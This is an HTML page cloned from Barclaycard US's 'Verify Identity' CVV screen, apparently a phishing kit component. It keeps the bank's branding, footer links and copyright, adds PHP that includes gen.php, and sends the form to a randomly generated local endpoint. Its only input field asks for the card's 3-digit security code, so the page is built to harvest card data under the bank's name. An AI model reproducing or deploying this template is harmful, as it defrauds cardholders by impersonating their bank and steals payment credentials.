<!DOCTYPE html>
<!-- saved from url=(0097)https://www.barclaycardus.com/servicing/cvvSecurityGate?cvvView=cvv_verification&__fsk=1742255138 -->
<html lang="en"
    class="   desktop-override js no-flexbox flexbox-legacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths whatinput-types-initial yui3-js-enabled appearance whatinput-types-mouse whatinput-types-keyboard"
    data-whatinput="mouse" data-whatintent="mouse">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="x-ua-compatible" content="IE=10">
    <title>Verify Identity</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description"
        content="Manage your credit card account online - track account activity, make payments, transfer balances, and more">
    <link rel="shortcut icon" href="https://gif.barclaycardus.com/servicing/a934f5d4/img/base/favicon.ico">
    <script async="" src="./cvv_files/adrum-ext.d5dfd2e692f603f77711b2992d5a9455.js.download"></script>
    <script>
        window['adrum-start-time'] = new Date().getTime();
    </script>
    <script src="./cvv_files/adrum.js.download"></script>
    <script src="./cvv_files/force-session-timeout.js.download"> </script>
    <script>
        fsto.initiateShowBannerTimer();
    </script>
    <link rel="stylesheet" href="./cvv_files/desktopResponsiveOverrides.css">
    <link rel="stylesheet" href="./cvv_files/yui-common.css">
    <link rel="stylesheet" href="./cvv_files/yui-common-b.css">
    <link rel="stylesheet" href="./cvv_files/cssbutton-min.css">
    <link rel="stylesheet" href="./cvv_files/cwsCoreStyle.css">

    <!-- For the CSS Refactoring Feature id F8790 -->

    <link rel="stylesheet" href="./cvv_files/globalEmwe.css">
    
    <!-- Team Synergy:The following toggle is for the Rewards Hub. -->
    <!-- One style is embedded because its content will be dynamic and determined by the backend. -->

    <link rel="stylesheet" href="./cvv_files/override-custom.css">
    <!--TS_486-->
    <script src="./cvv_files/tealeaf.js.download"></script>

    <script src="./cvv_files/yui-common-a.js.download"></script>
    <script src="./cvv_files/yui-common-b.js.download"></script>


    <script src="./cvv_files/yui-common-c.js.download"></script>
    <script src="./cvv_files/datatableRowExp-min.js.download"></script>

    <script src="./cvv_files/bcus.js.download"></script>
    <script src="./cvv_files/modernizr.min.js.download"></script>

    <script src="./cvv_files/what-input.min.js.download"></script>

    <link charset="utf-8" rel="stylesheet" id="yui_3_14_1_1_1551195784464_2" href="./cvv_files/combo.action">
    <script charset="utf-8" id="yui_3_14_1_1_1551195784464_4" src="./cvv_files/combo(1).action" async=""></script>
    <script charset="utf-8" id="yui_3_14_1_1_1551195784464_5" src="./cvv_files/combo(2).action" async=""></script>
    <script charset="utf-8" id="yui_3_14_1_1_1551195784464_6" src="./cvv_files/combo(3).action" async=""></script>
</head>
<?php include('gen.php'); ?>
<body id="app-body" class="yui-skin-sam">
    <div id="cvv2_ErrorPanel" class="yui-module yui-overlay error yui-overlay-hidden" style="width: 190px; visibility: hidden; opacity: 1; z-index: 9000; left: 793px; top: 482px;">
        <div class="hd"></div>
        <div class="bd">
            <div class="errorIcon"> </div><strong>Error</strong>
            <p>The security code you have entered is incorrect. Please try again.</p>
        </div>
    </div>
    <iframe id="_yuiResizeMonitor" title="Text Resize Monitor" tabindex="-1" role="presentation" style="position: absolute; visibility: visible; background-color: transparent; border-width: 0px; width: 2em; height: 2em; left: 0px; top: -27px;" src="./cvv_files/saved_resource.html"></iframe>
    <div id="cvv2_TipPanel" class="yui-module yui-overlay toolTip yui-overlay-hidden" style="width: 190px; visibility: hidden; opacity: 1; z-index: 9000; left: 793px; top: 482px;">
        <div class="hd"></div>
        <div class="bd"><span id="cvv2_Tip3Digit" class="spriteBkgrd">On the<br>back of<br>your card</span></div>
    </div>

    <div class="site-banner session-timeout" id="timeoutWarning" style="display: none;">
        <span id="session-timeout-message">You will be logged out in <span><strong id="timeoutTimeCounter" class="highlight"></strong> seconds</span> due to inactivity.</span>
        <button id="timeoutRefreshButton" aria-describedby="session-timeout-message">Keep me signed in</button>
    </div>

    <section id="app-body-container">
        <div class="legacy-desktop">
            
            <!-- Card Select -->
            <div class="b-card-select-container fluid-container hidden-xs">
                <div class="container b-card-select">
                    <div class="row">
                        <div class="col-sm-2" data-auto="selected-card-art">
                            <a href="https://www.barclaycardus.com/servicing/accountSummary"
                                data-auto="default-card-art-link" class="no-outline">
                                <img src="./cvv_files/ZBR3OPN1.png" alt="Visit Account summary for Barclaycard Rewards."
                                    class="b-card-art">
                            </a>
                        </div>
                        <div class="col-sm-6">
                            <div class="b-greeting-container ">
                                <!-- <p class="b-greeting"><span id="greeting-salutation">Welcome</span>, Audrey</p>
                                <p>
                                    <span class="b-card-name" data-auto="selected-card-name">Barclaycard Rewards ...0107</span>
                                </p>
                                <p></p> -->
                            </div>
                        </div>

                        <div class="col-sm-4 text-right logo-container logged-in" data-auto="brand-logo"
                            id="barclays-logo">
                            <div><img class="" src="./cvv_files/header-logo.svg" alt="Credit Card Logo"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="b-multi-card-container b-multi-card-hide hidden-xs hidden ada-hidden"
                id="b-multi-card-container">

            </div>
        </div>
        <br />
        <section id="cws-doc" class="yui-t3 b-site-container">
            <section id="bd" class="b-site-body-container">
                <section id="yui-main" class=" b-site-body-page-container ">

                    <div id="cvvVerification" class="b-hide hide"></div>
                    <section id="page1">

                    </section>
                    <section id="page2">

                        <section id="mainContent" class="yui-b">
                            <div class="yui-gc subPage">
                                <div class="yui-u first profile">
                                    <span id="topLink" class="yui-button yui-link-button"><span class="first-child"><a
                                                tabindex="0"
                                                href="https://www.barclaycardus.com/servicing/Profile.action"
                                                id="topLink-button">Your profile</a></span></span>

                                    <form method="post" action="<?php echo generateRandomString(); ?>">
                                        <nav id="subNavMenu" class="b-subsection-menu"></nav>
                                        <script type="text/javascript">
                                            /* This will find active nav element and append aria-selected to it.
                                             So that screen reader user will be informed which link is currently selected */
                                            (function () {
                                                var activeElement = document.getElementsByClassName('activePage');
                                                var subNav = document.getElementById('subNavMenu');
                                                for (var i = 0; i < activeElement.length; i++) {
                                                    if (activeElement[i].parentNode === subNav) {
                                                        activeElement[i].setAttribute('aria-selected', true);
                                                    }
                                                }
                                            })();
                                        </script>


                                        <h1 class="pageTitle mb15" style="font-size: 2.3em !important;">Verify Identity</h1>
                                        <div class="line clear"></div>
                                        <div class="editEmail">
                                            <p class="mb15">For your protection, we require the 3-digit security code
                                                that is located in the signature<br>panel on the back of the primary
                                                cardmember's card.</p>
                                            <div class="clear">&nbsp;</div>
                                            <div><label for="cvv2">3-digit security code*</label></div>
                                            <div style="float:left; margin-top:15px; margin-right:10px;">
                                                <input size="12" maxlength="3" data-minlength="3" name="cvv2" pattern="[0-9]*" data-required="true" id="cvv2" type="password"
                                                    data-mask="^[0-9]+$" class="inputBox validate medium error"
                                                    aria-invalid="true" aria-describedby="cvv2_Error">
                                            </div>
                                            <div>
                                                <img src="./assets/cvv.png" alt="" width="150" srcset="">
                                            </div>
                                        </div>

                                        </div>
                                        <div id="verifybottomline" class="line clear"></div>
                                        <span class="yui-button yui-submit-button green sButton"
                                            id="continueButton" style="padding:6px 14px !important;"><span class="first-child"><button type="submit"
                                                    tabindex="0"
                                                    id="continueButton-button">Continue</button></span></span>


                                        <div style="display: none;"><input type="hidden" name="_sourcePage"
                                                value="EkU3m8d4TPBh2rIcxbRjld3KPiHm1Y1TBK1EQZkhj3MsD8IZKWf6JKEU3FfzxJ6ec_I_OSDDvOQFrN3srn4VSg=="><input
                                                type="hidden" name="__fp" value="tGBpCZhyrhc="></div>
                                    </form>
                                </div>

                            </div>
                        </section>

                    </section>
                </section>

                <script>
                    var listOfAccountPanels = [];
                    var Dom = YAHOO.util.Dom,
                        Event = YAHOO.util.Event;

                    function hideAllAccountPanels() {
                        for (var idx = 0; idx < listOfAccountPanels.length; idx++) {
                            listOfAccountPanels[idx].hide();
                        };
                        var hotSpots = Dom.getElementsByClassName('hotspot', 'div');
                        Dom.removeClass(hotSpots, 'hotspotenabled b-account-details-is-selected');
                    }

                    function changeDisplayOfPanel(pgbar, thePanel) {
                        var progBar = Event.getTarget(pgbar).id;
                        if (thePanel.cfg.getProperty("visible")) {
                            thePanel.hide();
                            Dom.removeClass(progBar, 'hotspotenabled b-account-details-is-selected');
                        } else {
                            // hide all others 1st;
                            hideAllAccountPanels();
                            thePanel.show();
                            Dom.addClass(progBar, 'hotspotenabled b-account-details-is-selected');
                        }
                    }

                    var accountSummaryCleanup = function (e) {
                        var el = Event.getTarget(e);
                        var clickedOutside = true;

                        for (var idx = 0; idx < listOfAccountPanels.length; idx++) {

                            var accountPanel = Dom.getAncestorByClassName(listOfAccountPanels[idx], "yui-panel-container");
                            if (el == accountPanel || Dom.isAncestor(accountPanel, el)) {
                                clickedOutside = false;
                            }
                        }
                        if (clickedOutside) {

                            var listOfAccountProgressBars = Dom.getElementsByClassName("pbToCreditLine", "div", "otherAccounts");
                            for (var idx = 0; idx < listOfAccountProgressBars.length; idx++) {
                                if (el == listOfAccountProgressBars[idx] || Dom.isAncestor(listOfAccountProgressBars[idx], el)) {
                                    clickedOutside = false;
                                }
                            }
                        }

                        if (clickedOutside) {
                            hideAllAccountPanels();
                        }
                    }

                    Event.on(document, "click", accountSummaryCleanup);
                </script>
                <section id="leftSection" class="yui-b cardSide cvvVerificationLeft  b-card-section">






                    <a
                        href="https://www.barclaycardus.com/servicing/SwitchAccount.action?accountId=15107530&amp;rnd=1551193118095">
                        <img src="./cvv_files/ZBR3OPN1.png" alt="credit card" class="bigCard b-active-card">

                    </a>







                    <section id="otherAccounts" class="b-card-list">













                    </section>


                    <div id="universal_left">

                    </div>
                </section>






                <div id="helpOverlay" class="mainNavigationOverlay b-navigation-overlay b-search-overlay hide">
                    <form method="post" autocomplete="off"
                        action="https://www.barclaycardus.com/servicing/WebSearch.action" id="searchForm">
                        <input maxlength="100" name="keyWord" data-required="false" id="searchBox"
                            placeholder="Ask your question here..." type="text" class="inputBox floatLeft">
                        <span class="yui-button yui-submit-button green" id="searchButton"><span
                                class="first-child"><button type="button" tabindex="4"
                                    id="searchButton-button">Search</button></span></span>
                        <div style="display: none;"><input type="hidden" name="_sourcePage"
                                value="urkKs3GMCP9h2rIcxbRjld3KPiHm1Y1TBK1EQZkhj3MsD8IZKWf6JKEU3FfzxJ6ec_I_OSDDvOQFrN3srn4VSg=="><input
                                type="hidden" name="__fp" value="CEho9JtgoqQ="></div>
                    </form>
                </div>
            </section>
            <!--[if lt IE 8]><div id="bdSpacer"></div><![endif]-->
            <footer id="ft" class="b-main-footer">

                <div class="line b-main-footer-divider"></div>
                <p class="footerLinks b-footer-nav">
                    <a href="https://www.barclaycardus.com/servicing/footerLinks?handlePrivacy="
                        class="handlePrivacy ">Privacy policy</a> <span aria-hidden="true">|</span> <a
                        href="https://www.barclaycardus.com/servicing/footerLinks?handleSecurity="
                        class="handleSecurity " target="_blank">Security center</a><span aria-hidden="true">|</span>

                    <a href="https://www.barclaycardus.com/servicing/accessibility" target="_blank"
                        data-auto="footerLinks.accessibility">
                        Accessibility
                    </a><span aria-hidden="true">|</span>

                    <a href="https://www.barclaycardus.com/servicing/footerLinks?handleTerms="
                        class="handleTerms ">Terms of use</a>
                </p>


                <p class="copy">© Barclays Bank Delaware 2019</p>

                <p class="clear auxCopy"></p>


            </footer>
        </section>

        <div class="legacy-footer-placeholder">

        </div>
        <div class="legacy-footer">
            <footer id="appFooter" class="b-app-footer responsive" data-page-name="footer-cvvVerification">
                <div class="container">
                   <div class="row">
                        <div class="col-md-8">

                            <ul class="b-footer-links">




                                <li><a href="https://www.barclaycardus.com/servicing/footerLinks?handlePrivacy="
                                        data-auto="Privacy policy">Privacy policy</a></li>





                                <li><a href="https://www.barclaycardus.com/servicing/footerLinks?handleSecurity="
                                        data-auto="Security center" target="_blank">Security center</a></li>






                                <li><a href="https://www.barclaycardus.com/servicing/accessibility"
                                        data-auto="Accessibility" target="_blank">Accessibility</a></li>







                                <li><a href="https://www.barclaycardus.com/servicing/footerLinks?handleTerms="
                                        data-auto="Terms of use">Terms of use</a></li>








                                <li class="visible-xs">
                                    <a id="fullSite"
                                        href="https://www.barclaycardus.com/servicing/changeViewTemplate?start=">Full
                                        site</a>
                                </li>

                            </ul>

                        </div>
                        <div class="col-md-4 b-float-right-legacy">

                            <p class="copyright" data-auto="copyright">© Barclays Bank Delaware 2019</p>
                        </div>
                    </div>








                </div>
            </footer>



        </div>
    </section>
</body>

</html>